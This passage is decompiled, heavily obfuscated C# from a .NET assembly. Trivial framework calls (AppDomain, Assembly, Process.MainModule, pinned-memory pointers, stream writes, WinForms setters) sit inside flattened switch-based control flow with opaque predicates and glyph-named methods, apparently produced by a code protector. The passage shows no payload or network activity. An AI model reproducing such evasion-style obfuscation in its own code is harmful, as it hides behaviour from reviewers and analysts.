            num2 = (int) ⴗ[7] - 172;
            continue;
          case 11:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[56] - 52;
            continue;
          case 12:
          case 14:
            int num4;
            switch ((obj1 ^ (int) obj0) - 26 ^ num1)
            {
              case 0:
                num4 = (int) ⴗ[59] - 206;
                break;
              case 1:
                num4 = (int) ⴀ[164] - (int) ⴀ[164];
                break;
              case 2:
                num4 = 8;
                break;
              case 3:
                num4 = (int) ⴗ[110] - (int) ⴗ[62];
                break;
              case 4:
                num4 = 3;
                break;
              case 5:
                num4 = 20;
                break;
              case 6:
                num4 = (int) ⴗ[90] - 164;
                break;
              case 7:
                num4 = 9;
                break;
              case 8:
                num4 = (int) ⴗ[35];
                break;
              case 9:
                num4 = (int) ⴗ[164] - 122;
                break;
              case 10:
                num4 = 10;
                break;
              case 11:
                num4 = 11;
                break;
              case 12:
                num4 = 1;
                break;
              case 13:
                num4 = (int) ⴗ[81] - 217;
                break;
              case 14:
                num4 = (int) ⴀ[118] - 108;
                break;
              default:
                num4 = 13;
                break;
            }
            num2 = num4;
            continue;
          case 13:
            evidenceFactory = (IEvidenceFactory) null;
            num2 = 5;
            continue;
          case 16:
            goto label_3;
          case 17:
            num2 = (int) ⴀ[90] - 227;
            continue;
          case 18:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 5;
            continue;
          case 19:
            goto label_40;
          case 20:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[9] / 8;
            continue;
          case 21:
          case 22:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 5;
            continue;
          case 23:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[172] - 93;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႰႳ);
            num2 = (int) ⴀ[119] + (int) ⴀ[36];
            continue;
        }
      }
label_40:
      return (AppDomain) evidenceFactory;
    }

    internal static AppDomain ႰႠ([In] int obj0, [In] short obj1)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = 12;
      object obj;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 1:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[167] - 85;
            continue;
          case 2:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 3:
            obj = (object) AppDomain.CurrentDomain;
            goto case 24;
          case 4:
          case 32:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[132];
            continue;
          case 5:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[132];
            continue;
          case 7:
            goto label_3;
          case 8:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[132];
            continue;
          case 9:
            obj = (object) AppDomain.CurrentDomain;
            goto case 33;
          case 10:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[265] + 29;
            continue;
          case 11:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 12:
            int num4;
            switch (((int) obj1 ^ obj0) - 115 ^ num1)
            {
              case 0:
                num4 = 14;
                break;
              case 1:
                num4 = (int) ⴗ[269] - (int) ⴗ[9];
                break;
              case 2:
                num4 = (int) ⴀ[96] - 212;
                break;
              case 3:
                num4 = 3;
                break;
              case 4:
                num4 = 25;
                break;
              case 5:
                num4 = 16;
                break;
              case 6:
                num4 = 34;
                break;
              case 7:
                num4 = 9;
                break;
              case 8:
                num4 = 22;
                break;
              case 9:
                num4 = 26;
                break;
              case 10:
                num4 = 18;
                break;
              case 11:
                num4 = 23;
                break;
              case 12:
                num4 = (int) ⴗ[219] - 222;
                break;
              case 13:
                num4 = (int) ⴀ[113] - 109;
                break;
              case 14:
                num4 = 10;
                break;
              case 15:
                num4 = (int) ⴗ[13];
                break;
              case 16:
                num4 = 8;
                break;
              case 17:
                num4 = (int) ⴗ[120] - (int) ⴗ[72];
                break;
              case 18:
                num4 = 11;
                break;
              case 19:
                num4 = 13;
                break;
              case 20:
                num4 = 2;
                break;
              case 21:
                num4 = 28;
                break;
              case 22:
                num4 = 5;
                break;
              case 23:
                num4 = (int) ⴀ[95] - 92;
                break;
              case 24:
                num4 = 27;
                break;
              case 25:
                num4 = (int) ⴀ[54] - 224;
                break;
              default:
                num4 = (int) ⴀ[8] - (int) ⴀ[30];
                break;
            }
            num2 = num4;
            continue;
          case 13:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 14:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 15:
            num2 = num3 % 2 != 0 ? 12 : (int) ⴀ[14] - 147;
            continue;
          case 16:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 17:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[150] - (int) ⴗ[213];
            continue;
          case 18:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 19:
            goto label_64;
          case 20:
            obj = (object) null;
            num2 = (int) ⴀ[132];
            continue;
          case 21:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[167] - (int) ⴗ[1];
            continue;
          case 22:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[9] / 3;
            continue;
          case 23:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[132];
            continue;
          case 24:
            num2 = (int) ⴀ[132];
            continue;
          case 25:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 26:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴀ[140] / 4;
            continue;
          case 27:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 28:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 29:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 30:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 31:
            obj = (object) AppDomain.CurrentDomain;
            num2 = 35;
            continue;
          case 33:
            num2 = 35;
            continue;
          case 34:
            obj = (object) AppDomain.CurrentDomain;
            num2 = (int) ⴗ[203] / 6;
            continue;
          case 35:
            ++num1;
            int num5 = (int) obj1;
            int num6 = num5 * num5;
            num3 = (int) obj1 + num6;
            num2 = (int) ⴀ[90] - 226;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႰႠ);
            num2 = (int) ⴗ[8] * 7;
            continue;
        }
      }
label_64:
      return (AppDomain) obj;
    }

    internal static Assembly ႰႼ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = 3;
      ISerializable assembly;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_8;
          case 1:
            ++num1;
            goto case 4;
          case 2:
            int num4 = 20;
            num2 = 85 < num3 / 4 - num4 ? (int) ⴀ[119] / 3 : (int) ⴀ[26] - 102;
            continue;
          case 3:
            assembly = (ISerializable) obj0.Assembly;
            goto case 1;
          case 4:
            num3 = 340;
            num2 = 2;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႰႼ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return (Assembly) assembly;
    }

    internal static int ႤႣ([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] char obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 4;
      int int32;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            int32 = BitConverter.ToInt32(obj0, obj1);
            goto case 5;
          case 2:
          case 6:
            goto label_7;
          case 3:
            num2 = 916 < 1832 / 2 - 622 ? 4 : 2;
            continue;
          case 5:
            ++num1;
            num2 = (int) ⴗ[236] / 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႤႣ);
            num2 = (int) ⴀ[36];
            continue;
        }
      }
label_7:
      return int32;
    }

    internal static short ႤႰ([In] byte[] obj0, [In] int obj1, [In] char obj2, [In] char obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[83] - 209;
      short int16;
      while (true)
      {
        switch (num2)
        {
          case 0:
            ++num1;
            goto case 1;
          case 1:
            num2 = (int) ⴀ[19] - (int) ⴀ[172];
            continue;
          case 3:
          case 6:
            num2 = 8;
            continue;
          case 4:
            goto label_3;
          case 5:
            num2 = 960 > 192 - 27 * 5 ? 7 : 3;
            continue;
          case 7:
            goto label_9;
          case 8:
            int16 = BitConverter.ToInt16(obj0, obj1);
            goto case 0;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႤႰ);
            num2 = (int) ⴀ[56] - 53;
            continue;
        }
      }
label_9:
      return int16;
    }

    internal static byte[] ႤႤ([In] int obj0, [In] short obj1, [In] int obj2)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 2;
      Array bytes;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            bytes = (Array) BitConverter.GetBytes(obj0);
            ++num1;
            num3 = 1350;
            num2 = 4;
            continue;
          case 1:
          case 3:
            goto label_6;
          case 4:
            int num4 = 517;
            num2 = 675 < num3 / 2 - num4 ? 2 : 3;
            continue;
          case 5:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႤႤ);
            num2 = (int) ⴗ[136] - 236;
            continue;
        }
      }
label_6:
      return bytes as byte[];
    }

    internal static ProcessModule ႤႥ([In] Process obj0, [In] int obj1, [In] short obj2)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = 7;
      object mainModule;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
          case 4:
            goto label_7;
          case 1:
            num2 = 1176 > 196 - num3 * 6 ? (int) ⴗ[125] / 2 : 6;
            continue;
          case 2:
          case 8:
            goto label_3;
          case 6:
            num2 = (int) ⴀ[36];
            continue;
          case 7:
            mainModule = (object) obj0.MainModule;
            ++num1;
            num3 = 95;
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႤႥ);
            num2 = (int) ⴗ[157] - 75;
            continue;
        }
      }
label_7:
      return (ProcessModule) mainModule;
    }

    internal static void ႤႷ(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3,
      [In] short obj4,
      [In] short obj5)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 6;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = num3 % 2 != 0 ? (int) ⴗ[35] : 5;
            continue;
          case 1:
          case 2:
            obj0.Write(obj1, obj2, obj3);
            goto case 4;
          case 3:
            int num4 = (int) obj5;
            int num5 = num4 * num4;
            num3 = (int) obj5 + num5;
            goto case 0;
          case 4:
            ++num2;
            num1 = 3;
            continue;
          case 5:
            goto label_7;
          default:
            num2 = 0;
            num1 = 2;
            continue;
        }
      }
label_7:;
    }

    internal static IntPtr ႤႭ([In] ref GCHandle obj0, [In] int obj1, [In] short obj2)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 5;
      IntPtr num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_3;
          case 1:
          case 5:
            num3 = obj0.AddrOfPinnedObject();
            ++num1;
            goto case 3;
          case 3:
            int num4 = (int) obj2;
            num2 = (num4 * num4 + (int) obj2) % 2 == 0 ? 6 : 4;
            continue;
          case 4:
            num2 = 5;
            continue;
          case 6:
            goto label_7;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႤႭ);
            num2 = (int) ⴗ[22] - (int) ⴗ[22];
            continue;
        }
      }
label_7:
      return num3;
    }

    internal static void ႤႨ([In] Control obj0, [In] EventHandler obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 3;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++num2;
            int num3 = (int) obj2;
            num1 = (num3 * num3 + (int) obj2) % 2 == 0 ? (int) ⴗ[207] - (int) ⴗ[259] : (int) ⴗ[125];
            continue;
          case 1:
            goto label_6;
          case 2:
            obj0.Click -= obj1;
            goto case 0;
          case 4:
            goto label_7;
          case 5:
            goto label_8;
          case 6:
            num1 = (int) ⴀ[9] - 38;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴀ[98] - 222;
            continue;
        }
      }
label_6:
      return;
label_7:
      return;
label_8:;
    }

    internal static void ႤႳ([In] Control obj0, [In] DockStyle obj1, [In] short obj2, [In] char obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 2:
            obj0.Dock = obj1;
            goto case 5;
          case 3:
            goto label_6;
          case 4:
            goto label_7;
          case 5:
            ++num2;
            int num3 = (int) obj3;
            num1 = (num3 * num3 + (int) obj3) % 2 == 0 ? 3 : 6;
            continue;
          case 6:
            num1 = 2;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴀ[118] - 112;
            continue;
        }
      }
label_6:
      return;
label_7:;
    }

    internal static TableLayoutRowStyleCollection ႤႠ(
      [In] TableLayoutPanel obj0,
      [In] int obj1,
      [In] char obj2)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴀ[18] - (int) ⴀ[122];
      object rowStyles;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_3;
          case 1:
          case 4:
            rowStyles = (object) obj0.RowStyles;
            goto case 5;
          case 3:
            goto label_7;
          case 5:
            ++num1;
            int num4 = (int) obj2;
            num3 = num4 * num4;
            num2 = (int) ⴗ[125];
            continue;
          case 6:
            num3 = (int) obj2 + num3;
            num2 = num3 % 2 != 0 ? (int) ⴀ[106] - 56 : 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႤႠ);
            num2 = 0;
            continue;
        }
      }
label_7:
      return rowStyles as TableLayoutRowStyleCollection;
    }

    internal static void ႤႼ([In] PictureBox obj0, [In] PictureBoxSizeMode obj1, [In] int obj2, [In] short obj3)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            obj0.SizeMode = obj1;
            goto case 2;
          case 2:
            ++num2;
            int num3 = (int) obj3;
            int num4 = (num3 * num3 + (int) obj3) % 2;
            jDxmSbcafQKRuIHXbd.Ⴗ[80] = (byte) ((int) jDxmSbcafQKRuIHXbd.Ⴗ[80] + (int) obj3 & 63);
            num1 = num4 == 0 ? 6 : (int) ⴗ[38] - 227;
            continue;
          case 4:
            num1 = 0;
            continue;
          case 5:
            goto label_6;
          case 6:
            goto label_7;
          default:
            num2 = 0;
            num1 = 0;
            continue;
        }
      }
label_6:
      return;
label_7:;
    }

    internal static void ႥႣ([In] PictureBox obj0, [In] bool obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 1;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 2:
            ++num2;
            goto case 5;
          case 3:
            num3 = (int) obj2 + num3;
            num1 = num3 % 2 != 0 ? 6 : (int) ⴀ[71] - 181;
            continue;
          case 4:
          case 6:
            obj0.TabStop = obj1;
            goto case 2;
          case 5:
            int num4 = (int) obj2;
            num3 = num4 * num4;
            num1 = 3;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴗ[39] - 205;
            continue;
        }
      }
label_7:;
    }

    internal static void ႥႰ([In] Control obj0, [In] Size obj1, [In] char obj2, [In] short obj3)
    {
      byte[] ⴀ = MyApplication.Ⴀ;
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            num1 = 3;
            continue;
          case 2:
            int num3 = (int) obj3;
            num1 = (num3 * num3 + (int) obj3) % 2 == 0 ? 4 : 5;
            continue;
          case 3:
            obj0.MaximumSize = obj1;
            ++num2;
            goto case 2;
          case 4:
            goto label_6;
          case 6:
            goto label_7;
          default:
            num2 = 0;
            num1 = (int) ⴀ[189] - 107;
            continue;
        }
      }
label_6:
      return;
label_7:;
    }

    internal static void ႥႤ([In] Label obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      int num1 = 5;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            obj0.Text = obj1;
            ++num2;
            num3 = 456;
            goto case 6;
          case 1:
            int num4 = 119;
            num1 = 152 < num3 / 3 - num4 ? (int) ⴗ[215] - 68 : 3;
            continue;
          case 3:
            goto label_6;
          case 4:
            goto label_7;
          case 6:
            num1 = 1;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴗ[128] - 227;
            continue;
        }
      }
label_6:
      return;
label_7:;
    }

    internal static string ႥႥ([In] string obj0, [In] short obj1, [In] short obj2)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴀ[19] - 97;
      IEnumerable withoutExtension;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_3;
          case 1:
            goto label_8;
          case 3:
            ++num1;
            goto case 7;
          case 5:
            num2 = 6;
            continue;
          case 6:
            withoutExtension = (IEnumerable) Path.GetFileNameWithoutExtension(obj0);
            goto case 3;
          case 7:
            int num3 = (int) obj1;
            num2 = (num3 * num3 + (int) obj1) % 2 == 0 ? 1 : 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႥႥ);
            num2 = (int) ⴗ[173] - 6;
            continue;
        }
      }
label_8:
      string str = (string) withoutExtension;
      MyApplication.Ⴀ[59] = (byte) ((int) MyApplication.Ⴀ[59] * (int) MyApplication.Ⴀ[41] & 59);
      return str;
    }

    internal static string ႥႷ([In] string obj0, [In] string[] obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴗ = jDxmSbcafQKRuIHXbd.Ⴗ;
      byte[] ⴀ = MyApplication.Ⴀ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[149] - 87;
      IConvertible resourceString;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
          case 4:
          case 6:
            num2 = (int) ⴀ[62] - 163;
            continue;
          case 5:
            num2 = 385 > 55 - 23 * 7 ? 7 : (int) ⴀ[56] - 53;
            continue;
          case 7:
            goto label_7;
          case 8:
            resourceString = (IConvertible) Utils.GetResourceString(obj0, obj1);
            ++num1;
            num2 = (int) ⴀ[(int) sbyte.MaxValue] - 219;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႰႭ.ႥႷ);
            num2 = 0;
            continue;
        }
      }
label_7:
      return resourceString as string;
    }

    [StructLayout(LayoutKind.Explicit, Size = 908, Pack = 1)]
    private struct ႰႷ
    {
    }
  }
}
